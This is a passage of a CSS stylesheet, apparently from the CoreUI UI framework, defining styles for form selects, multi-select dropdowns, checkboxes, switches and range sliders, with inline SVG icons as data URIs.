            }
            .form-control-color.form-control-sm {
                height: calc(1.5em + 0.5rem + 2px);
            }
            .form-control-color.form-control-lg {
                height: calc(1.5em + 1rem + 2px);
            }
            .form-select {
                display: block;
                width: 100%;
                -moz-padding-start: calc(0.75rem - 3px);
                font-size: 1rem;
                font-weight: 400;
                line-height: 1.5;
                color: var(--cui-form-select-color, rgba(44, 56, 74, 0.95));
                background-color: var(--cui-form-select-bg, #fff);
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAxNiAxNic+PHBhdGggZmlsbD0nbm9uZScgc3Ryb2tlPScjNjM2ZjgzJyBzdHJva2UtbGluZWNhcD0ncm91bmQnIHN0cm9rZS1saW5lam9pbj0ncm91bmQnIHN0cm9rZS13aWR0aD0nMicgZD0nbTIgNSA2IDYgNi02Jy8+PC9zdmc+);
                background-repeat: no-repeat;
                background-size: 16px 12px;
                border: 1px solid var(--cui-form-select-border-color, #b1b7c1);
                border-radius: 0.375rem;
                transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
            }
            html:not([dir="rtl"]) .form-select {
                padding: 0.375rem 2.25rem 0.375rem 0.75rem;
                background-position: right 0.75rem center;
            }
            *[dir="rtl"] .form-select {
                padding: 0.375rem 0.75rem 0.375rem 2.25rem;
                background-position: left 0.75rem center;
            }
            @media (prefers-reduced-motion: reduce) {
                .form-select {
                    transition: none;
                }
            }
            .form-select:focus {
                border-color: var(--cui-form-select-focus-border-color, #998fed);
                outline: 0;
                box-shadow: 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
            }
            .form-select[multiple],
            .form-select[size]:not([size="1"]) {
                background-image: none;
            }
            html:not([dir="rtl"]) .form-select[multiple],
            html:not([dir="rtl"]) .form-select[size]:not([size="1"]) {
                padding-right: 0.75rem;
            }
            *[dir="rtl"] .form-select[multiple],
            *[dir="rtl"] .form-select[size]:not([size="1"]) {
                padding-left: 0.75rem;
            }
            .form-select:disabled {
                color: var(--cui-form-select-disabled-color);
                background-color: var(--cui-form-select-disabled-bg, #d8dbe0);
                border-color: var(--cui-form-select-disabled-border-color, #b1b7c1);
            }
            .form-select:-moz-focusring {
                color: transparent;
                text-shadow: 0 0 0 var(--cui-form-select-color, rgba(44, 56, 74, 0.95));
            }
            .form-select-sm {
                padding-top: 0.25rem;
                padding-bottom: 0.25rem;
                font-size: 0.875rem;
                border-radius: 0.25rem;
            }
            html:not([dir="rtl"]) .form-select-sm {
                padding-left: 0.5rem;
            }
            *[dir="rtl"] .form-select-sm {
                padding-right: 0.5rem;
            }
            .form-select-lg {
                padding-top: 0.5rem;
                padding-bottom: 0.5rem;
                font-size: 1.25rem;
                border-radius: 0.5rem;
            }
            html:not([dir="rtl"]) .form-select-lg {
                padding-left: 1rem;
            }
            *[dir="rtl"] .form-select-lg {
                padding-right: 1rem;
            }
            .dark-theme .form-select > option {
                background-color: #44454e;
            }
            .form-multi-select {
                --cui-form-multi-select-padding-y: 0.375rem;
                --cui-form-multi-select-padding-x: 0.75rem;
                --cui-form-multi-select-font-family: ;
                --cui-form-multi-select-font-size: 1rem;
                --cui-form-multi-select-font-weight: 400;
                --cui-form-multi-select-line-height: 1.5;
                --cui-form-multi-select-color: rgba(44, 56, 74, 0.95);
                --cui-form-multi-select-bg: #fff;
                --cui-form-multi-select-bg-position: right 0.75rem center;
                --cui-form-multi-select-bg-size: 16px 12px;
                --cui-form-multi-select-border-color: #b1b7c1;
                --cui-form-multi-select-border: 1px solid var(--cui-form-multi-select-border-color);
                --cui-form-multi-select-border-radius: 0.375rem;
                --cui-form-multi-select-disabled-color: #8a93a2;
                --cui-form-multi-select-disabled-bg: #d8dbe0;
                --cui-form-multi-select-focus-color: rgba(44, 56, 74, 0.95);
                --cui-form-multi-select-focus-bg: #fff;
                --cui-form-multi-select-focus-border-color: #6557e4;
                --cui-form-multi-select-selection-tags-padding-y: 0.125rem;
                --cui-form-multi-select-selection-tags-padding-x: 0.125rem;
                --cui-form-multi-select-indicator: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3e%3cpath fill='none' stroke='%23636f83' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M2 5l6 6 6-6'/%3e%3c/svg%3e");
                --cui-form-multi-select-indicator-padding: 2.25rem;
                --cui-form-multi-select-cleaner-width: 0.75rem;
                --cui-form-multi-select-cleaner-height: 0.75rem;
                --cui-form-multi-select-cleaner-padding-y: 0.5rem;
                --cui-form-multi-select-cleaner-padding-x: 0.75rem;
                --cui-form-multi-select-cleaner-bg: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba%2844, 56, 74, 0.681%29'%3e%3cpath d='M.293.293a1 1 0 011.414 0L8 6.586 14.293.293a1 1 0 111.414 1.414L9.414 8l6.293 6.293a1 1 0 01-1.414 1.414L8 9.414l-6.293 6.293a1 1 0 01-1.414-1.414L6.586 8 .293 1.707a1 1 0 010-1.414z'/%3e%3c/svg%3e");
                --cui-form-multi-select-cleaner-hover-bg: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba%2844, 56, 74, 0.95%29'%3e%3cpath d='M.293.293a1 1 0 011.414 0L8 6.586 14.293.293a1 1 0 111.414 1.414L9.414 8l6.293 6.293a1 1 0 01-1.414 1.414L8 9.414l-6.293 6.293a1 1 0 01-1.414-1.414L6.586 8 .293 1.707a1 1 0 010-1.414z'/%3e%3c/svg%3e");
                --cui-form-multi-select-cleaner-focus-bg: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba%2844, 56, 74, 0.95%29'%3e%3cpath d='M.293.293a1 1 0 011.414 0L8 6.586 14.293.293a1 1 0 111.414 1.414L9.414 8l6.293 6.293a1 1 0 01-1.414 1.414L8 9.414l-6.293 6.293a1 1 0 01-1.414-1.414L6.586 8 .293 1.707a1 1 0 010-1.414z'/%3e%3c/svg%3e");
                --cui-form-multi-select-search-color: rgba(44, 56, 74, 0.95);
                --cui-form-multi-select-search-bg: #fff;
                --cui-form-multi-select-search-border-radius: 0.375rem;
                --cui-form-multi-select-select-all-padding-y: 0.5rem;
                --cui-form-multi-select-select-all-padding-x: 0.75rem;
                --cui-form-multi-select-select-all-color: rgba(44, 56, 74, 0.681);
                --cui-form-multi-select-select-all-bg: transparent;
                --cui-form-multi-select-select-all-border-color: #b1b7c1;
                --cui-form-multi-select-select-all-border: 1px solid var(--cui-form-multi-select-select-all-border-color);
                --cui-form-multi-select-select-all-hover-color: rgba(44, 56, 74, 0.95);
                --cui-form-multi-select-select-all-hover-bg: transparent;
                --cui-form-multi-select-options-margin-top: 0.625rem;
                --cui-form-multi-select-options-bg: #fff;
                --cui-form-multi-select-options-border-color: #d8dbe0;
                --cui-form-multi-select-options-border: 1px solid var(--cui-form-multi-select-options-border-color);
                --cui-form-multi-select-options-border-radius: 0.375rem;
                --cui-form-multi-select-options-padding-y: 0.5rem;
                --cui-form-multi-select-options-padding-x: 0.75rem;
                --cui-form-multi-select-options-color: rgba(44, 56, 74, 0.95);
                --cui-form-multi-select-option-padding-y: 0.5rem;
                --cui-form-multi-select-option-padding-x: 1.25rem;
                --cui-form-multi-select-option-border-radius: 0.375rem;
                --cui-form-multi-select-option-hover-color: #4b586d;
                --cui-form-multi-select-option-hover-bg: rgba(235, 237, 239, 0.5);
                --cui-form-multi-select-option-disabled-color: #8a93a2;
                --cui-form-multi-select-option-indicator-width: 1em;
                --cui-form-multi-select-option-indicator-bg: #fff;
                --cui-form-multi-select-option-indicator-border: 1px solid rgba(0, 0, 21, 0.25);
                --cui-form-multi-select-option-indicator-border-radius: 0.25em;
                --cui-form-multi-select-option-selected-bg: #ebedef;
                --cui-form-multi-select-option-selected-indicator-bg: #321fdb;
                --cui-form-multi-select-option-selected-indicator-bg-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20'%3e%3cpath fill='none' stroke='rgba%28255, 255, 255, 0.87%29' stroke-linecap='round' stroke-linejoin='round' stroke-width='3' d='m6 10 3 3 6-6'/%3e%3c/svg%3e");
                --cui-form-multi-select-option-selected-indicator-border-color: #321fdb;
                --cui-form-multi-select-tag-padding-y: calc(0.125rem - 1px);
                --cui-form-multi-select-tag-padding-x: 0.5rem;
                --cui-form-multi-select-tag-margin-y: 0.125rem;
                --cui-form-multi-select-tag-margin-x: 0.125rem;
                --cui-form-multi-select-tag-bg: #ebedef;
                --cui-form-multi-select-tag-border-color: #d8dbe0;
                --cui-form-multi-select-tag-border: 1px solid var(--cui-form-multi-select-tag-border-color);
                --cui-form-multi-select-tag-border-radius: 0.25rem;
                position: relative;
                display: block;
                width: 100%;
                padding: var(--cui-form-multi-select-padding-y) var(--cui-form-multi-select-padding-x);
                font-family: var(--cui-form-multi-select-font-family);
                font-size: var(--cui-form-multi-select-font-size);
                font-weight: var(--cui-form-multi-select-font-weight);
                line-height: var(--cui-form-multi-select-line-height);
                color: var(--cui-form-multi-select-color);
                background-color: var(--cui-form-multi-select-bg);
                background-image: var(--cui-form-multi-select-indicator);
                background-repeat: no-repeat;
                background-size: var(--cui-form-multi-select-bg-size);
                border: var(--cui-form-multi-select-border);
                border-radius: var(--cui-form-multi-select-border-radius);
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
            }
            html:not([dir="rtl"]) .form-multi-select {
                padding-right: var(--cui-form-multi-select-indicator-padding);
                background-position: var(--cui-form-multi-select-bg-position);
            }
            *[dir="rtl"] .form-multi-select {
                padding-left: var(--cui-form-multi-select-indicator-padding);
                background-position: var(--cui-form-multi-select-bg-position);
            }
            .form-multi-select:disabled,
            .form-multi-select.disabled {
                color: var(--cui-form-multi-select-disabled-color);
                background-color: var(--cui-form-multi-select-disabled-bg);
            }
            .form-multi-select:disabled .form-multi-select-search,
            .form-multi-select.disabled .form-multi-select-search {
                background: 0 0;
            }
            html:not([dir="rtl"]) .form-multi-select.form-multi-select-with-cleaner {
                padding-right: 4.5rem;
            }
            *[dir="rtl"] .form-multi-select.form-multi-select-with-cleaner {
                padding-left: 4.5rem;
            }
            .form-multi-select.is-invalid {
                --cui-form-multi-select-border-color: #e55353;
            }
            .form-multi-select.is-valid {
                --cui-form-multi-select-border-color: #2eb85c;
            }
            .form-multi-select > div:not([class]):first-of-type::before {
                position: absolute;
                top: 0;
                right: 0;
                width: 40px;
                height: 100%;
                content: "";
            }
            .form-multi-select-selection-tags {
                min-height: 2.25rem;
                padding: var(--cui-form-multi-select-selection-tags-padding-y) var(--cui-form-multi-select-selection-tags-padding-x);
            }
            html:not([dir="rtl"]) .form-multi-select-selection-tags {
                padding-right: var(--cui-form-multi-select-indicator-padding);
            }
            *[dir="rtl"] .form-multi-select-selection-tags {
                padding-left: var(--cui-form-multi-select-indicator-padding);
            }
            .form-multi-select-selection-tags .form-multi-select-search {
                height: 2rem;
            }
            html:not([dir="rtl"]) .form-multi-select-selection-tags .form-multi-select-search {
                margin-left: var(--cui-form-multi-select-padding-x);
            }
            *[dir="rtl"] .form-multi-select-selection-tags .form-multi-select-search {
                margin-right: var(--cui-form-multi-select-padding-x);
            }
            .form-multi-select-selection {
                display: inline;
                padding: 0;
            }
            .form-multi-select-selection-cleaner {
                position: absolute;
                top: 50%;
                box-sizing: content-box;
                width: var(--cui-form-multi-select-cleaner-width);
                height: var(--cui-form-multi-select-cleaner-height);
                padding: var(--cui-form-multi-select-cleaner-padding-y) var(--cui-form-multi-select-cleaner-padding-x);
                background-color: transparent;
                background-image: var(--cui-form-multi-select-cleaner-bg);
                background-repeat: no-repeat;
                background-position: center;
                background-size: var(--cui-form-multi-select-cleaner-width) auto;
                border: 0;
                transform: translateY(-50%);
            }
            html:not([dir="rtl"]) .form-multi-select-selection-cleaner {
                right: var(--cui-form-multi-select-indicator-padding);
                border-right: 1px solid var(--cui-form-multi-select-cleaner-border-color, #b1b7c1);
            }
            *[dir="rtl"] .form-multi-select-selection-cleaner {
                left: var(--cui-form-multi-select-indicator-padding);
                border-left: 1px solid var(--cui-form-multi-select-cleaner-border-color, #b1b7c1);
            }
            .form-multi-select-selection-cleaner:hover {
                background-image: var(--cui-form-multi-select-cleaner-hover-bg);
            }
            .form-multi-select-selection-cleaner:focus {
                background-image: var(--cui-form-multi-select-cleaner-focus-bg);
                outline: 0;
            }
            .form-multi-select-search {
                width: auto;
                padding: 0;
                font-family: inherit;
                font-size: inherit;
                font-weight: inherit;
                line-height: inherit;
                color: var(--cui-form-multi-select-search-color);
                background-color: var(--cui-form-multi-select-search-bg);
                border: 0;
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
                border-radius: var(--cui-form-multi-select-search-border-radius);
            }
            .form-multi-select-search:focus {
                outline: 0;
            }
            .form-multi-select-search[size] {
                display: none;
            }
            html:not([dir="rtl"]) .form-multi-select-search[size] {
                margin-left: var(--cui-form-multi-select-padding-x);
            }
            *[dir="rtl"] .form-multi-select-search[size] {
                margin-right: var(--cui-form-multi-select-padding-x);
            }
            .form-multi-select-search:-moz-placeholder-shown {
                width: 100%;
            }
            .form-multi-select-search:placeholder-shown {
                width: 100%;
            }
            .form-multi-select-all {
                display: block;
                width: 100%;
                padding: var(--cui-form-multi-select-select-all-padding-y) var(--cui-form-multi-select-select-all-padding-x);
                color: var(--cui-form-multi-select-select-all-color);
                text-align: start;
                background-color: var(--cui-form-multi-select-select-all-bg);
                border: 0;
                border-bottom: var(--cui-form-multi-select-select-all-border);
            }
            .form-multi-select-all:hover {
                color: var(--cui-form-multi-select-select-all-hover-color);
                background-color: var(--cui-form-multi-select-select-all-hover-bg);
            }
            .form-multi-select-dropdown {
                position: absolute;
                top: 100%;
                left: 0;
                display: none;
                width: 100%;
                margin-top: var(--cui-form-multi-select-options-margin-top);
                background-color: var(--cui-form-multi-select-options-bg);
                background-clip: padding-box;
                border: var(--cui-form-multi-select-options-border);
                border-radius: var(--cui-form-multi-select-options-border-radius);
                box-shadow: 0 4px 5px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 1px 10px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 2px 4px -1px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
            }
            .form-multi-select-dropdown:not([class*="border"]) {
                border: 0;
            }
            .form-multi-select-options {
                padding: var(--cui-form-multi-select-options-padding-y) var(--cui-form-multi-select-options-padding-x);
                font-size: 1rem;
                color: var(--cui-form-multi-select-options-color);
            }
            .form-multi-select-option {
                position: relative;
                padding: var(--cui-form-multi-select-option-padding-y) var(--cui-form-multi-select-option-padding-x);
                margin-bottom: 2px;
                vertical-align: top;
                cursor: pointer;
                border-radius: var(--cui-form-multi-select-option-border-radius);
            }
            .form-multi-select-option:hover,
            .form-multi-select-option:focus {
                color: var(--cui-form-multi-select-option-hover-color);
                text-decoration: none;
                background-color: var(--cui-form-multi-select-option-hover-bg);
            }
            .form-multi-select-option.disabled,
            .form-multi-select-option:disabled {
                color: var(--cui-form-multi-select-option-disabled-color);
                pointer-events: none;
                background-color: transparent;
            }
            .form-multi-select-option.form-multi-select-option-with-checkbox {
                padding: 0.5rem 1.25rem;
            }
            html:not([dir="rtl"]) .form-multi-select-option.form-multi-select-option-with-checkbox {
                padding-left: calc(var(--cui-form-multi-select-option-padding-x) + var(--cui-form-multi-select-option-indicator-width));
            }
            *[dir="rtl"] .form-multi-select-option.form-multi-select-option-with-checkbox {
                padding-right: calc(var(--cui-form-multi-select-option-padding-x) + var(--cui-form-multi-select-option-indicator-width));
            }
            .form-multi-select-option.form-multi-select-option-with-checkbox::before {
                position: absolute;
                top: 0.7rem;
                display: block;
                width: var(--cui-form-multi-select-option-indicator-width);
                height: var(--cui-form-multi-select-option-indicator-width);
                pointer-events: none;
                content: "";
                background-color: var(--cui-form-multi-select-option-indicator-bg);
                background-repeat: no-repeat;
                background-position: center;
                background-size: contain;
                border: var(--cui-form-multi-select-option-indicator-border);
                border-radius: var(--cui-form-multi-select-option-indicator-border-radius);
            }
            html:not([dir="rtl"]) .form-multi-select-option.form-multi-select-option-with-checkbox::before {
                left: calc(var(--cui-form-multi-select-option-padding-x) * 0.5);
            }
            *[dir="rtl"] .form-multi-select-option.form-multi-select-option-with-checkbox::before {
                right: calc(var(--cui-form-multi-select-option-padding-x) * 0.5);
            }
            .form-multi-select-option.form-multi-selected {
                background-color: var(--cui-form-multi-select-option-selected-bg);
            }
            .form-multi-select-option.form-multi-selected::before {
                background-color: var(--cui-form-multi-select-option-selected-indicator-bg);
                background-image: var(--cui-form-multi-select-option-selected-indicator-bg-image);
                border-color: var(--cui-form-multi-select-option-selected-indicator-border-color);
            }
            .form-multi-select-optgroup-label {
                padding: 0.75rem 0.625rem 0.5rem;
                font-size: 80%;
                font-weight: 700;
                color: rgba(44, 56, 74, 0.38);
                text-transform: uppercase;
            }
            .form-multi-select-options-empty {
                padding: var(--cui-form-multi-select-option-padding-y) var(--cui-form-multi-select-option-padding-x);
            }
            .form-multi-select-tag {
                display: inline-block;
                padding: var(--cui-form-multi-select-tag-padding-y) var(--cui-form-multi-select-tag-padding-x);
                margin: var(--cui-form-multi-select-tag-margin-y) var(--cui-form-multi-select-tag-margin-x);
                background-color: var(--cui-form-multi-select-tag-bg);
                border: var(--cui-form-multi-select-tag-border);
                border-radius: var(--cui-form-multi-select-tag-border-radius);
            }
            .form-multi-select-tag-delete {
                padding: 0;
                background-color: transparent;
                border: 0;
            }
            html:not([dir="rtl"]) .form-multi-select-tag-delete {
                margin-left: 0.5rem;
            }
            *[dir="rtl"] .form-multi-select-tag-delete {
                margin-right: 0.5rem;
            }
            .form-multi-select.show {
                color: var(--cui-form-multi-select-focus-color);
                background-color: var(--cui-form-multi-select-focus-bg);
                border-color: var(--cui-form-multi-select-focus-border-color);
                box-shadow: 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
            }
            .form-multi-select.show .form-multi-select-search[size] {
                display: inline;
            }
            .form-multi-select.show .form-multi-select-dropdown {
                z-index: 1000;
                display: initial;
            }
            .form-multi-select-sm {
                --cui-form-multi-select-padding-y: 0.25rem;
                --cui-form-multi-select-padding-x: 0.5rem;
                --cui-form-multi-select-font-size: 0.875rem;
                --cui-form-multi-select-border-radius: 0.25rem;
                --cui-form-multi-select-selection-tags-padding-x: 0.125rem;
                --cui-form-multi-select-tag-padding-y: 0;
                --cui-form-multi-select-tag-padding-x: 0.5rem;
                --cui-form-multi-select-tag-margin-y: 0.0675rem;
                --cui-form-multi-select-tag-margin-x: 0.0675rem;
                --cui-form-multi-select-tag-border-radius: 0.125rem;
            }
            .form-multi-select-sm.form-multi-select-selection-tags {
                min-height: 1.8125rem;
            }
            .form-multi-select-sm.form-multi-select-selection-tags .form-multi-select-search {
                height: calc(1.6775rem - 2px);
            }
            .form-multi-select-lg {
                --cui-form-multi-select-padding-y: 0.5rem;
                --cui-form-multi-select-padding-x: 1rem;
                --cui-form-multi-select-font-size: 1.25rem;
                --cui-form-multi-select-border-radius: 0.5rem;
                --cui-form-multi-select-selection-tags-padding-x: 0.125rem;
                --cui-form-multi-select-tag-padding-y: calc(0.25rem - 1px);
                --cui-form-multi-select-tag-padding-x: 0.5rem;
                --cui-form-multi-select-tag-margin-y: 0.125rem;
                --cui-form-multi-select-tag-margin-x: 0.125rem;
                --cui-form-multi-select-tag-border-radius: 0.375rem;
            }
            .form-multi-select-lg.form-multi-select-selection-tags {
                min-height: calc(2.875rem + 2px);
            }
            .form-multi-select-lg.form-multi-select-selection-tags .form-multi-select-search {
                height: 2.625rem;
            }
            .form-check {
                display: block;
                min-height: 1.5rem;
                margin-bottom: 0.125rem;
            }
            html:not([dir="rtl"]) .form-check {
                padding-left: 1.5em;
            }
            *[dir="rtl"] .form-check {
                padding-right: 1.5em;
            }
            html:not([dir="rtl"]) .form-check .form-check-input {
                float: left;
                margin-left: -1.5em;
            }
            *[dir="rtl"] .form-check .form-check-input {
                float: right;
                margin-right: -1.5em;
            }
            .form-check-reverse {
                padding-right: 1.5em;
                padding-left: 0;
                text-align: right;
            }
            .form-check-reverse .form-check-input {
                float: right;
                margin-right: -1.5em;
                margin-left: 0;
            }
            .form-check-input {
                width: 1em;
                height: 1em;
                margin-top: 0.25em;
                vertical-align: top;
                background-color: var(--cui-form-check-input-bg, #fff);
                background-repeat: no-repeat;
                background-position: center;
                background-size: contain;
                border: 1px solid rgba(0, 0, 21, 0.25);
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
                -webkit-print-color-adjust: exact;
                color-adjust: exact;
                print-color-adjust: exact;
            }
            .form-check-input[type="checkbox"] {
                border-radius: 0.25em;
            }
            .form-check-input[type="radio"] {
                border-radius: 50%;
            }
            .form-check-input:active {
                filter: brightness(90%);
            }
            .form-check-input:focus {
                border-color: #998fed;
                outline: 0;
                box-shadow: 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
            }
            .form-check-input:checked {
                background-color: var(--cui-form-check-input-checked-bg-color, #321fdb);
                border-color: var(--cui-form-check-input-checked-border-color, #321fdb);
            }
            .form-check-input:checked[type="checkbox"] {
                background-image: var(
                    --cui-form-check-input-checked-bg-image,
                    url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20'%3e%3cpath fill='none' stroke='rgba%28255, 255, 255, 0.87%29' stroke-linecap='round' stroke-linejoin='round' stroke-width='3' d='m6 10 3 3 6-6'/%3e%3c/svg%3e")
                );
            }
            .form-check-input:checked[type="radio"] {
                background-image: var(--cui-form-check-radio-checked-bg-image, url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='-4 -4 8 8'%3e%3ccircle r='2' fill='rgba%28255, 255, 255, 0.87%29'/%3e%3c/svg%3e"));
            }
            .form-check-input[type="checkbox"]:indeterminate {
                background-color: #321fdb;
                border-color: #321fdb;
                background-image: var(
                    --cui-form-check-input-indeterminate-bg-image,
                    url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 20 20'%3e%3cpath fill='none' stroke='rgba%28255, 255, 255, 0.87%29' stroke-linecap='round' stroke-linejoin='round' stroke-width='3' d='M6 10h8'/%3e%3c/svg%3e")
                );
            }
            .form-check-input:disabled {
                pointer-events: none;
                filter: none;
                opacity: 0.5;
            }
            .form-check-input[disabled] ~ .form-check-label,
            .form-check-input:disabled ~ .form-check-label {
                cursor: default;
                opacity: 0.5;
            }
            .form-check-label {
                color: var(--cui-form-check-label-color, unset);
            }
            html:not([dir="rtl"]) .form-switch {
                padding-left: 2.5em;
            }
            *[dir="rtl"] .form-switch {
                padding-right: 2.5em;
            }
            .form-switch .form-check-input {
                width: 2em;
                background-image: var(--cui-form-switch-bg-image, url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='-4 -4 8 8'%3e%3ccircle r='3' fill='rgba%280, 0, 21, 0.25%29'/%3e%3c/svg%3e"));
                background-position: left center;
                border-radius: 2em;
                transition: background-position 0.15s ease-in-out;
            }
            html:not([dir="rtl"]) .form-switch .form-check-input {
                margin-left: -2.5em;
            }
            *[dir="rtl"] .form-switch .form-check-input {
                margin-right: -2.5em;
            }
            @media (prefers-reduced-motion: reduce) {
                .form-switch .form-check-input {
                    transition: none;
                }
            }
            .form-switch .form-check-input:focus {
                background-image: var(--cui-form-switch-focus-bg-image, url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='-4 -4 8 8'%3e%3ccircle r='3' fill='%23998fed'/%3e%3c/svg%3e"));
            }
            .form-switch .form-check-input:checked {
                background-position: right center;
                background-image: var(--cui-form-switch-checked-bg-image, url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='-4 -4 8 8'%3e%3ccircle r='3' fill='rgba%28255, 255, 255, 0.87%29'/%3e%3c/svg%3e"));
            }
            .form-switch.form-check-reverse {
                padding-right: 2.5em;
                padding-left: 0;
            }
            .form-switch.form-check-reverse .form-check-input {
                margin-right: -2.5em;
                margin-left: 0;
            }
            .form-switch-lg {
                min-height: 1.25em;
            }
            html:not([dir="rtl"]) .form-switch-lg {
                padding-left: 2.25em;
            }
            *[dir="rtl"] .form-switch-lg {
                padding-right: 2.25em;
            }
            .form-switch-lg .form-check-input {
                width: 1.75em;
                height: 1.25em;
            }
            html:not([dir="rtl"]) .form-switch-lg .form-check-input {
                margin-left: -2.25em;
            }
            *[dir="rtl"] .form-switch-lg .form-check-input {
                margin-right: -2.25em;
            }
            .form-switch-lg .form-check-label {
                padding-top: calc((1.25em - 1rem) / 2);
            }
            .form-switch-xl {
                min-height: 1.5em;
            }
            html:not([dir="rtl"]) .form-switch-xl {
                padding-left: 2.5em;
            }
            *[dir="rtl"] .form-switch-xl {
                padding-right: 2.5em;
            }
            .form-switch-xl .form-check-input {
                width: 2em;
                height: 1.5em;
            }
            html:not([dir="rtl"]) .form-switch-xl .form-check-input {
                margin-left: -2.5em;
            }
            *[dir="rtl"] .form-switch-xl .form-check-input {
                margin-right: -2.5em;
            }
            .form-switch-xl .form-check-label {
                padding-top: calc((1.5em - 1rem) / 2);
            }
            .form-check-inline {
                display: inline-block;
            }
            html:not([dir="rtl"]) .form-check-inline {
                margin-right: 1rem;
            }
            *[dir="rtl"] .form-check-inline {
                margin-left: 1rem;
            }
            .btn-check {
                position: absolute;
                clip: rect(0, 0, 0, 0);
                pointer-events: none;
            }
            .btn-check[disabled] + .btn,
            .btn-check:disabled + .btn {
                pointer-events: none;
                filter: none;
                opacity: 0.65;
            }
            .form-check-primary {
                --cui-form-check-input-checked-bg-color: #321fdb;
                --cui-form-check-input-checked-border-color: #321fdb;
                --cui-form-check-input-indeterminate-bg-color: #321fdb;
                --cui-form-check-input-indeterminate-border-color: #321fdb;
            }
            .form-check-secondary {
                --cui-form-check-input-checked-bg-color: #9da5b1;
                --cui-form-check-input-checked-border-color: #9da5b1;
                --cui-form-check-input-indeterminate-bg-color: #9da5b1;
                --cui-form-check-input-indeterminate-border-color: #9da5b1;
            }
            .form-check-success {
                --cui-form-check-input-checked-bg-color: #2eb85c;
                --cui-form-check-input-checked-border-color: #2eb85c;
                --cui-form-check-input-indeterminate-bg-color: #2eb85c;
                --cui-form-check-input-indeterminate-border-color: #2eb85c;
            }
            .form-check-info {
                --cui-form-check-input-checked-bg-color: #39f;
                --cui-form-check-input-checked-border-color: #39f;
                --cui-form-check-input-indeterminate-bg-color: #39f;
                --cui-form-check-input-indeterminate-border-color: #39f;
            }
            .form-check-warning {
                --cui-form-check-input-checked-bg-color: #f9b115;
                --cui-form-check-input-checked-border-color: #f9b115;
                --cui-form-check-input-indeterminate-bg-color: #f9b115;
                --cui-form-check-input-indeterminate-border-color: #f9b115;
            }
            .form-check-danger {
                --cui-form-check-input-checked-bg-color: #e55353;
                --cui-form-check-input-checked-border-color: #e55353;
                --cui-form-check-input-indeterminate-bg-color: #e55353;
                --cui-form-check-input-indeterminate-border-color: #e55353;
            }
            .form-check-light {
                --cui-form-check-input-checked-bg-color: #ebedef;
                --cui-form-check-input-checked-border-color: #ebedef;
                --cui-form-check-input-indeterminate-bg-color: #ebedef;
                --cui-form-check-input-indeterminate-border-color: #ebedef;
            }
            .form-check-dark {
                --cui-form-check-input-checked-bg-color: #4f5d73;
                --cui-form-check-input-checked-border-color: #4f5d73;
                --cui-form-check-input-indeterminate-bg-color: #4f5d73;
                --cui-form-check-input-indeterminate-border-color: #4f5d73;
            }
            .form-range {
                width: 100%;
                height: 1.5rem;
                padding: 0;
                background-color: transparent;
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
            }
            .form-range:focus {
                outline: 0;
            }
            .form-range:focus::-webkit-slider-thumb {
                box-shadow: 0 0 0 1px #fff, 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
            }
            .form-range:focus::-moz-range-thumb {
                box-shadow: 0 0 0 1px #fff, 0 0 0 0.25rem rgba(50, 31, 219, 0.25);
            }
            .form-range::-moz-focus-outer {
                border: 0;
            }
            .form-range::-webkit-slider-thumb {
                width: 1rem;
                height: 1rem;
                margin-top: -0.25rem;
                background-color: var(--cui-form-range-thumb-bg, #321fdb);
                border: 0;
                border-radius: 1rem;
                -webkit-transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
                transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
                -webkit-appearance: none;
                appearance: none;
            }
            @media (prefers-reduced-motion: reduce) {
                .form-range::-webkit-slider-thumb {
                    -webkit-transition: none;
                    transition: none;
                }
            }
            .form-range::-webkit-slider-thumb:active {
                background-color: var(--cui-form-range-thumb-active-bg, #c2bcf4);
            }
            .form-range::-webkit-slider-runnable-track {
                width: 100%;
                height: 0.5rem;
                color: transparent;
                cursor: pointer;
                background-color: var(--cui-form-range-track-bg, #c4c9d0);
                border-color: transparent;
                border-radius: 1rem;
            }
            .form-range::-moz-range-thumb {
                width: 1rem;
                height: 1rem;
                background-color: var(--cui-form-range-thumb-bg, #321fdb);
                border: 0;
                border-radius: 1rem;
                -moz-transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
                transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
                -moz-appearance: none;
                appearance: none;
            }
            @media (prefers-reduced-motion: reduce) {
                .form-range::-moz-range-thumb {
                    -moz-transition: none;
                    transition: none;
                }
            }
